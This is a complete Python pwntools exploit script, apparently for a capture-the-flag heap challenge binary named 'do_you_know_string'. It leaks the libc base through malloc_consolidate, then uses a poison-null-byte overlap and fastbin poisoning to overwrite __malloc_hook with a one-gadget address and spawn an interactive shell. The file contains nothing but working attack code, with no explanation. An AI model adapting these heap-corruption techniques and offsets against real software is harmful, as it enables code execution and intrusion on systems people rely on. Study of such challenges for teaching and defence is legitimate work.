from pwn import *

IS_DEBUG = False

p = process("./do_you_know_string",aslr=not IS_DEBUG)

def add(data) :
	p.sendlineafter(">>>","1")
	p.sendlineafter(":",data)

def edit(idx,data)  :
	p.sendlineafter(">>>","4")
	p.sendlineafter(":",str(idx))
	p.sendlineafter(":",data)

def delete(idx) :
	p.sendlineafter(">>>","2")
	p.sendlineafter(":",str(idx))

def show(idx) :
	p.sendlineafter(">>>","3")
	p.sendlineafter(":",str(idx))

#trigger malloc_conslidate for leaking

add("B"*0x10) #0
add("B"*0x10) #1
add("B"*0x10) #2
add("B"*0x10) #3
add("B"*0x10) #4

delete(4)
delete(3)
delete(2)
delete(1)
delete(0)

add("B"*0x400)

add("")

show(1)

if IS_DEBUG :	
	libcbase = u64(p.recvuntil("\x2a")[-6:]+"\x00\x00") - (0x3c4b20+312)
else :	
	libcbase = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - (0x3c4b20+312)


print "libcbase : " + hex(libcbase)

delete(0)
delete(1)

#exploit poison null byte

add("A")#0
add("A"*0x20) #1
add("B"*0x207) #2
delete(1)
add("2"*0x47) #1
add(p64(0x200)*64) #3
add("z"*0x200) #4
add("9"*0x1e0) #5
add("z"*0x200) #6


edit(1,"")
edit(3,"")
edit(2,"")
edit(4,"")
edit(5,"")


delete(3)
delete(5)
delete(2)


edit(1,"C"*0x208)
add("A") #2
add("B"*0x40) #3
add("B"*0x67) #5
delete(5)
delete(4)
add("K"*0x40+p64(0)+p64(0x71)+p64(libcbase+0x3c4b10-35)+"A"*24)
edit(0,"A"*0x66)
edit(3,"\x00"*19+p64(libcbase+0xf02a4)+"\x00"*73)

delete(4) #call __malloc_hook , using error


p.interactive()
